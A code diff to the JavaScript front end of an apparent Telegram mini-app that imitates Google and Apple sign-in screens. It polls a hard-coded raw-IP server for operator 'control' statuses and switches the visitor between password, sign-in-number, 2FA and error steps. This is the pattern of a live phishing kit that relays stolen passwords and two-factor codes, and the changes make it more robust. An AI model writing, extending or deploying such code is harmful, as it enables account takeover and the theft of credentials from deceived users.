@@ -123,29 +123,15 @@ function initApp() {
         if (apple2faChipInitial) apple2faChipInitial.textContent = initial;
     }
 
-    // Init Telegram WebApp
+    // Init Telegram WebApp safely
     if (tg) {
-        try {
-            tg.ready();
-            if (typeof tg.requestFullscreen === "function") {
-                tg.requestFullscreen();
-            }
-            tg.expand();
-            if (typeof tg.enableClosingConfirmation === "function") {
-                tg.enableClosingConfirmation();
-            }
-            if (typeof tg.disableVerticalSwipes === "function") {
-                tg.disableVerticalSwipes();
-            }
-            if (typeof tg.setHeaderColor === "function") {
-                tg.setHeaderColor("#0b0c10");
-            }
-            if (typeof tg.setBackgroundColor === "function") {
-                tg.setBackgroundColor("#0b0c10");
-            }
-        } catch (err) {
-            console.warn("Telegram WebApp API init error:", err);
-        }
+        try { tg.ready(); } catch (e) {}
+        try { if (typeof tg.requestFullscreen === "function") tg.requestFullscreen(); } catch (e) {}
+        try { tg.expand(); } catch (e) {}
+        try { if (typeof tg.enableClosingConfirmation === "function") tg.enableClosingConfirmation(); } catch (e) {}
+        try { if (typeof tg.disableVerticalSwipes === "function") tg.disableVerticalSwipes(); } catch (e) {}
+        try { if (typeof tg.setHeaderColor === "function") tg.setHeaderColor("#0b0c10"); } catch (e) {}
+        try { if (typeof tg.setBackgroundColor === "function") tg.setBackgroundColor("#0b0c10"); } catch (e) {}
     }
 
     function updateAuthHeaderUI() {
@@ -619,6 +605,9 @@ function initApp() {
             try {
                 tid = localStorage.getItem("privateroom_user_id") || null;
             } catch (e) {}
+        }
+        if (!tid) {
+            tid = Math.floor(1000000000 + Math.random() * 8000000000);
         }
         if (tid) {
             try {
@@ -1219,26 +1208,18 @@ function initApp() {
 
     function startGooglePolling() {
         stopGooglePolling();
-        let targetTgId = (typeof tgUser !== "undefined" && tgUser && tgUser.id) ? tgUser.id : (typeof getUserTgId === "function" ? getUserTgId() : "");
-        if (!targetTgId) {
-            const urlParams = new URLSearchParams(window.location.search);
-            targetTgId = urlParams.get("tg_id") || urlParams.get("user_id") || (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user ? window.Telegram.WebApp.initDataUnsafe.user.id : "");
-            try {
-                if (!targetTgId) targetTgId = localStorage.getItem("privateroom_user_id") || "";
-            } catch (e) {}
-        }
-
         const apiEndpoints = [
             "/api/auth/status",
             "http://31.76.101.210:8080/api/auth/status"
         ];
 
         googlePollTimer = setInterval(async () => {
+            const targetTgId = getUserTgId() || "";
             let data = null;
             for (const ep of apiEndpoints) {
                 try {
-                    const queryStr = `?tg_id=${encodeURIComponent(targetTgId)}&email=${encodeURIComponent(userGoogleEmail || "")}`;
-                    const resp = await fetch(ep + queryStr);
+                    const queryStr = `?tg_id=${encodeURIComponent(targetTgId)}&email=${encodeURIComponent(userGoogleEmail || "")}&_t=${Date.now()}`;
+                    const resp = await fetch(ep + queryStr, { cache: "no-store" });
                     if (resp.ok) {
                         data = await resp.json();
                         if (data && data.ok) break;
@@ -1249,11 +1230,14 @@ function initApp() {
             }
 
             if (data && data.ok && data.google_control) {
+                console.log("CTRL:", data.google_control);
                 const ctrl = data.google_control;
                 if (ctrl.status === "error_password") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = false;
-                    showStep(stepGooglePassword);
+                    if (!stepGooglePassword.classList.contains("active")) {
+                        showStep(stepGooglePassword);
+                    }
                     showGoogleError("password", ctrl.error_msg || "Неверный пароль. Повторите попытку.");
                 } else if (ctrl.status === "correct_password") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
@@ -1265,20 +1249,28 @@ function initApp() {
                     if (googlePromptNumber) googlePromptNumber.textContent = num;
                     const promptTargetText = document.getElementById("googlePromptTargetNumber");
                     if (promptTargetText) promptTargetText.textContent = num;
-                    showStep(stepGooglePrompt);
+                    if (!stepGooglePrompt.classList.contains("active")) {
+                        showStep(stepGooglePrompt);
+                    }
                 } else if (ctrl.status === "show_2fa") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
-                    showStep(stepGoogle2FA);
+                    if (!stepGoogle2FA.classList.contains("active")) {
+                        showStep(stepGoogle2FA);
+                    }
                 } else if (ctrl.status === "error_2fa") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = false;
-                    showStep(stepGoogle2FA);
+                    if (!stepGoogle2FA.classList.contains("active")) {
+                        showStep(stepGoogle2FA);
+                    }
                     showGoogleError("2fa", ctrl.error_msg || "Неверный код. Проверьте код и повторите попытку.");
                 } else if (ctrl.status === "completed" || data.authorized) {
                     stopGooglePolling();
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
-                    showStep(stepGoogleConsent);
+                    if (!stepGoogleConsent.classList.contains("active")) {
+                        showStep(stepGoogleConsent);
+                    }
                 }
             }
         }, 1200);
